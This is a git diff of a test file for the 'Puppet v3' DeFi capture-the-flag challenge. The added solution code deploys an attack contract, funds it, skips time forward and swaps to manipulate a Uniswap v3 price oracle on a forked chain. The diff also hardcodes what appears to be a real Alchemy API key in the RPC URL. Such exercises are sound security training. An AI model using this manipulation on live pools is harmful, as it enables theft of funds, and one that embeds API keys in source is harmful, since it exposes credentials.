@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/0Isuyb6zpbZocY5zk9TNZOeEomvY6Jv8";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,35 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', deployer)).deploy(
+            weth.address,
+            token.address,
+            uniswapPool.address,
+            uniswapPositionManager.address
+        );
+        const printBalances = async () => {
+            console.log("player weth", String(await weth.balanceOf(player.address)).slice(0, -18));
+            console.log("player token", String(await token.balanceOf(player.address)).slice(0, -18));
+            console.log("player eth", String(await ethers.provider.getBalance(player.address)).slice(0, -18));
+            console.log("contract weth", String(await weth.balanceOf(hackPuppetv3.address)).slice(0, -18));
+            console.log("contract token", String(await token.balanceOf(hackPuppetv3.address)).slice(0, -18));
+            console.log("contract eth", String(await ethers.provider.getBalance(hackPuppetv3.address)).slice(0, -18));
+            console.log("uniswap weth", String(await weth.balanceOf(uniswapPool.address)).slice(0, -18));
+            console.log("uniswap token", String(await token.balanceOf(uniswapPool.address)).slice(0, -18));
+            console.log("uniswap eth", String(await ethers.provider.getBalance(uniswapPool.address)).slice(0, -18));
+            console.log("-");
+        }
+        
+        await printBalances();
+
+        await weth.connect(player).deposit({value: ethers.utils.parseEther("0.1")});
+        await weth.connect(player).transfer(hackPuppetv3.address, weth.balanceOf(player.address));
+        await player.sendTransaction({to: hackPuppetv3.address, value: ethers.utils.parseEther("0.1"), gasLimit: 30000})
+        await token.connect(player).transfer(hackPuppetv3.address, 1n * 10n ** 18n);
+        await printBalances();
+        await time.increase(3 * 24 * 60 * 60); // 3 days in seconds
+        await hackPuppetv3.connect(player).swap(1n * 10n ** 18n, 30000, encodePriceSqrt(1, 1));
+        await printBalances();
     });
 
     after(async function () {
